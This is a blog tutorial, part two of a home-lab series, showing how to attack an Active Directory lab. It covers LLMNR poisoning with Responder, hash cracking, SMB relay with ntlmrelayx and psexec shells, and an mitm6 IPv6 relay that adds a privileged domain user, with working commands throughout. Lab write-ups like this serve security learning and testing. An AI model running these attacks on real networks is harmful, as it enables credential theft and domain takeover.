---
layout: post
title: AD Attack Lab Part Two (LLMNR poisoning, SMB relay, and IPv6 attack)
---
![Alt](https://bohansec.com/assets/AD-Attack-2/arthur-reeder-a661056QDbc-unsplash.jpg "Arthur Reeder")

In part two of the AD attack lab series, we will learn how to perform LLMNR poisoning, SMB relay, and IPv6 attack against the AD environment. If you do not have the AD environment set up yet, you can go to the [“AD attack lab part one”](https://bohansec.com/2020/10/10/How-To-Set-Up-AD-Attack-Lab-Part-1/){:target="_blank"} and follow the instruction to set the lab up. Note, I have changed my VMs spec in this lab. Currently, there are 4 VMs, they are Windows Server 2019, Windows 10 (2x), and Kali 2020.3. Each VMs assigned with 1 GB RAM and 1 Processor, and they all use the NAT network. If you do not have Kali installed yet, head over [here](https://www.kali.org/downloads/){:target="_blank"} to grab the latest version of Kali. Now, let’s dive into the lab setup. 

### Install Impacket

{% highlight js %}
wget https://bootstrap.pypa.io/get-pip.py
sudo python get-pip.py
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz
Extract the downloaded folder
cd impacket/
pip install .
sudo pip install .
{% endhighlight %}

Note, we will use Impacket 0.9.19 in this lab because of the compatible issue for some tools we are going to use. Also. notice that the Python2.7 is being used to install the pip so we will have the pip to use Python2.7.

![Configure Impacket](https://bohansec.com/assets/AD-Attack-2/1.PNG "Impacket")
![Configure Impacket](https://bohansec.com/assets/AD-Attack-2/2.PNG "Impacket")
![Configure Impacket](https://bohansec.com/assets/AD-Attack-2/3.PNG "Impacket")
![Configure Impacket](https://bohansec.com/assets/AD-Attack-2/5.PNG "Impacket")

### Perform LLMNR poisoning

Start all the 4 VMs. In kali, start the “Responder” and use the eth0 in this case with a Verbose mode. In one of the Windows 10 client, log in and try to access the Kali machine from the network drive. Note, this is for the demonstration purpose that someone in the network typed in a wrong network drive, and Responder now responds to this wrong DNS request. Essentially, the Responder tells the machine that it is the legit DNS server and asks the Windows 10 machine to send the hash to it. Note, 192.168.200.160 is the IP of Kali.

- Start the Responder

{% highlight js %}
sudo responder -I eth0 -rdwv
{% endhighlight %}

![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/7.PNG "LLMNR poisoning")
![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/8.PNG "LLMNR poisoning")

- Access our kali machine network drive from Windows 10 

![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/9.PNG "LLMNR poisoning")
![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/23.PNG "LLMNR poisoning")

Note, if your computers not visible in the network, you need to go to “Services” and turn on “Function Discover Resource Publication”.

- After a few seconds later, we see the captured NTLM hash

![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/10.PNG "LLMNR poisoning")

- Save the hash in a file, and use “Rockyou” and “Hashcat” to crack the hash

![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/11.PNG "LLMNR poisoning")
![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/12.PNG "LLMNR poisoning")
![LLMNR poisoning](https://bohansec.com/assets/AD-Attack-2/13.PNG "LLMNR poisoning")

We see the Administrator’s password is “password”.

### SMB relay

- Do a Nmap scan to see if the SMB signing is enforced

{% highlight js %}
sudo nmap --script=smb2-security-mode.nse -p445 192.168.200.0/24 
{% endhighlight %}

The SMB signing is enabled but not enforced which means the SMB relay attack would work.

![SMB relay](https://bohansec.com/assets/AD-Attack-2/15.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/16.PNG "SMB relay")

Save the target machine in a text file. Our target machine is the Windows 10 client, 192.168.200.158

![SMB relay](https://bohansec.com/assets/AD-Attack-2/17.PNG "SMB relay")

- Turn off SMB and HTTP servers in the Responder configuration file

{% highlight js %}
sudo nano /etc/responder/Responder.conf
{% endhighlight %}

![SMB relay](https://bohansec.com/assets/AD-Attack-2/18.PNG "SMB relay")

- Start the Responder and “ntlmrelayx.py” in the Kail machine

{% highlight js %}
sudo responder -I eth0 -rdwv
sudo ntlmrelayx.py -tf target.txt -smb2support
{% endhighlight %}

![SMB relay](https://bohansec.com/assets/AD-Attack-2/24.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/25.PNG "SMB relay")

- Access our kali machine network drive from Windows 10 

![SMB relay](https://bohansec.com/assets/AD-Attack-2/23.PNG "SMB relay")

Now, the received hash is being relayed to the target and used to dump the local hashes on the machine.

- Save the dumbed hash in a text file

![SMB relay](https://bohansec.com/assets/AD-Attack-2/25.PNG "SMB relay")

### Shell Access via SMB relay

- We can use “ntlmrelay.py” to obtain an interactive shell

![SMB relay](https://bohansec.com/assets/AD-Attack-2/27.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/28.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/28.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/30.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/31.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/32.PNG "SMB relay")

We can access the different shares in the shell includes C$ and ADMIN$

- Obtain a shell via Metasploit

Use the following module and set the variables as the following image shows:

{% highlight js %}
windows/smb/psexec
{% endhighlight %}

![SMB relay](https://bohansec.com/assets/AD-Attack-2/33.PNG "SMB relay")

After running the module, we obtained a shell. 

![SMB relay](https://bohansec.com/assets/AD-Attack-2/34.PNG "SMB relay")

- Obtain a shell via “psexec.py”

{% highlight js %}
sudo psexec.py kudos.local/bwallis:P@ssWord\!@192.168.200.156
{% endhighlight %}

![SMB relay](https://bohansec.com/assets/AD-Attack-2/35.PNG "SMB relay")

### IPv6 Attack via MITM6

- Install mitm6

{% highlight js %}
sudo git clone https://github.com/fox-it/mitm6
sudo python get-pip.py
sudo pip install .
{% endhighlight %}

![SMB relay](https://bohansec.com/assets/AD-Attack-2/36.PNG "SMB relay")
![SMB relay](https://bohansec.com/assets/AD-Attack-2/37.PNG "SMB relay")

Note, the image shows I used Python3 but I changed to Python2.7 later.

- Install the LDAPS Certificate on the server

Besides the screenshots shown in the following image, all the other steps can proceed with the default option. 

![MITM6](https://bohansec.com/assets/AD-Attack-2/39.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/40.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/41.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/42.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/43.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/44.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/45.PNG "MITM6")

- Restart the server

![MITM6](https://bohansec.com/assets/AD-Attack-2/46.PNG "MITM6")

- Verify if the LDAPS installed successfully by open LDP from PowerShell

![MITM6](https://bohansec.com/assets/AD-Attack-2/52.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/53.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/54.PNG "MITM6")

Note, if you can not connect to the LDAPS, try troubleshooting. I have to roll back to the previous snapshot early and re-install the CA role because for some reason my LDAPS wasn’t installed for the first time. 

- Start the “mitm6” and “ntlmrelayx.py” at the same time. 

{% highlight js %}
mitm6 -d kudos.local
sudo ntlmrelayx.py -6 -t ldaps://192.168.200.153 -wh fakewpad.kudos.local -l lootme
{% endhighlight %}

In the meanwhile, try to reboot one of your Windows 10 machines and log in the Windows 10 machine with the domain admin credential. 
![MITM6](https://bohansec.com/assets/AD-Attack-2/55.PNG "MITM6")


After a while, we see a new user is being added to the domain with a special privilege, at this point, we have full control over the domain. We can also see all the users the “ntlmrelayx.py” has enumerated in the “lootme” folder. We see the description field we created early for the “SQL Service” account. It’s never a good idea to leave any sensitive information in the description field of the user. 

![MITM6](https://bohansec.com/assets/AD-Attack-2/47.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/48.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/49.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/50.PNG "MITM6")
![MITM6](https://bohansec.com/assets/AD-Attack-2/51.PNG "MITM6")

In this post, we learned how to use LLMNR poisoning, SMB relay, and IPv6 attack against the misconfigured AD environment. In the following posts, I will continue to discuss other ways to enumerate and attack the AD environment. Thank you for reading :)